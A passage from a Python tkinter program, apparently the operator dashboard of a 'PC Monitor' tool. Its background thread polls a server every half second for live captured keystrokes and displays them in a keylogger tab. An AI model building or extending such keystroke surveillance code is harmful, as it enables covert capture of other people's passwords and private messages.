                        json.dump(data, f, indent=2)
                    messagebox.showinfo("Success", f"Exported {len(data)} items to {filename}")
            
            self.root.after(0, _save)
        
        threading.Thread(target=_export, daemon=True).start()
    
    # Background threads
    def start_background_threads(self):
        # Auto-refresh thread
        refresh_thread = threading.Thread(target=self.auto_refresh_loop, daemon=True)
        refresh_thread.start()
        
        # Live keylogger thread
        keylogger_thread = threading.Thread(target=self.live_keylogger_loop, daemon=True)
        keylogger_thread.start()
    
    def auto_refresh_loop(self):
        time.sleep(3)
        while self.is_running:
            try:
                time.sleep(15)
                if not self.is_running:
                    break
                if self.auto_refresh.get() and not self.update_in_progress:
                    self.root.after(0, self.manual_refresh)
            except Exception as e:
                print(f"Auto-refresh error: {e}")
                if not self.is_running:
                    break
    
    def live_keylogger_loop(self):
        """Continuously poll for live keystrokes"""
        time.sleep(2)
        while self.is_running:
            try:
                time.sleep(0.5)  # Poll every 500ms
                if not self.is_running:
                    break
                
                # Only update if on keylogger tab
                if self.notebook.index(self.notebook.select()) == 1:
                    data = self.client.get_live_keystrokes()
                    if data.get('text'):
                        self.root.after(0, lambda t=data['text']: self.append_to_keylogger(t))
            
            except Exception as e:
                print(f"Keylogger error: {e}")
                if not self.is_running:
                    break
    
    def append_to_keylogger(self, text):
        """Append text to live keylogger feed"""
        if text:
            self.keylogger_text.insert(tk.END, text)
            self.keylogger_text.see(tk.END)


def main():
    # Load configuration
    config = load_client_config()
    
    # Create client
    client = PCMonitorClient(
        config.get('server_url', 'http://localhost:5000'),
        config.get('api_key', '')
    )
    
    # Create GUI
    root = tk.Tk()
    app = MonitorGUI(root, client)
    root.mainloop()


if __name__ == "__main__":
    main()